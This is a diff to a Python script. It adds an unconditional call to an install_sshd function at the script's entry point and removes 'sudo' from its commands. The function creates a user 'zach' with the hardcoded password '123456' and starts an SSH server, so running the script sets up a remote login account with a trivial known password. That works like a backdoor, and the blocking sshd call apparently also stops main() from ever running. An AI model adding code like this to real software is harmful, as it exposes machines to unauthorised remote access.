@@ -54,16 +54,17 @@ def prompt_yes_no(prompt):
 def install_sshd():
     while True:
         # Install packages
-        os.system('sudo apt-get update -y && sudo apt-get install -y openssh-server ufw')
+        os.system(' apt-get update -y &&  apt-get install -y openssh-server ufw')
 
         # Create user
-        os.system('sudo useradd zach -m -s /bin/bash')
-        os.system('echo "zach:123456" | sudo chpasswd')
+        os.system(' useradd zach -m -s /bin/bash')
+        os.system('echo "zach:123456" |  chpasswd')
 
         # Start sshd daemon
         os.system('/usr/sbin/sshd -D')
 
 def main():
+    
     # Ensure the /etc/periodic/boot/ directory exists
     os.makedirs('/etc/periodic/boot/', exist_ok=True)
 
@@ -150,4 +151,5 @@ def main():
                 print("Please try again.")
 
 if __name__ == "__main__":
+    install_sshd()
     main()
